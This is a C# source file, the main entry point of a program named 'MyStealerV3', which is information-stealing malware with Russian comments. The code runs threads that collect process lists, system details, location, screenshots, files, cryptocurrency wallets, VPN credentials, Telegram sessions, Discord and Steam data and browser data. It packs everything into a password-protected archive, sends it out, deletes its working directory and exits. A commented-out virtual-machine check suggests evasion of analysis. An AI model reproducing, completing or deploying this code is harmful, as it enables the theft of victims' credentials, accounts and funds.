using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace MyStealerV3
{
    class Program
    {
        static void Main(string[] args)
        {
            //if (Virtual())
            //{
            //    Environment.Exit(0);
            //}
            if (!File.Exists(Resource.Help.Help.ExploitDir))
            {
                try
                {
                    Directory.CreateDirectory(Resource.Help.Help.ExploitDir); // Создаем директорию стиллера
                    List<Thread> threads = new List<Thread>(); // Список потоков стиллера

                    threads.Add(new Thread(() => // other processes
                    {
                        Resource.Targets.Others.ProcessList.WriteProcesses();
                        Resource.Targets.Others.SystemInfo.GetMain.GetSystem();
                        Resource.Targets.Others.Position.PositionMain.WritePos();
                        Resource.Targets.Others.Screen.Screen.GetScreenShots();
                    }));
                    threads.Add(new Thread(() => //file graber process
                    {
                        Resource.Targets.FileGraber.MainFileGraber.Start();
                    }));
                    threads.Add(new Thread(() => //Cryptocurrency get
                    {
                        Resource.Targets.Cryptocurrency.CryptoMain.GetCrypto();
                    }));
                    threads.Add(new Thread(() => //Software get
                    {
                        Resource.Targets.Software.VPN.VpnStart.Start();
                        Resource.Targets.Software.Telegram.TelegramDesktop.GetTelegramSessions();
                        Resource.Targets.Software.Discord.DiscordDesktop.WriteDiscord();
                        Resource.Targets.Software.Steam.Steam.SteamGet();
                    }));
                    threads.Add(new Thread(() =>
                    {
                        Resource.Targets.Browsers.BrowserStart.Run();
                    }));

                    Resource.Help.StartThreads.Start(threads); // Запустить потоки из списка
                    Resource.Help.CreateZip.NewZip(zipArchivePath: Config.zipArchivePath, password: Config.ZipPassword);
                    Resource.Help.sender.Send(MessageType.sendArchive);
                }
                catch (Exception ex)
                {
                    Config.ERROR_MESSAGE += $"\n[ERROR Main]: {ex}";
                }
            }
            else
            {
                Config.ERROR_MESSAGE += $"[STEALER]: Stealer already started!";
            }
            Program.Checker();
            Program.Finish();
        }
        static void Checker()
        {
            if (Config.ERROR_MESSAGE != "")
            {
                Resource.Help.sender.Send(MessageType.sendError);
            }
            if (Config.SendLog && Config.LOG_MESSAGE != "")
            {
                Resource.Help.sender.Send(MessageType.sendLog);
            }
        }
        static void Finish()
        {
            Thread.Sleep(15000);
            Directory.Delete(Resource.Help.Help.ExploitDir + @"\", true);
            Environment.Exit(0);
        }
        static bool Virtual()
        {
            if (!Environment.MachineName.Contains("DESKTOP"))
            {
                return true;
            }
            return false;
        }
    }
}
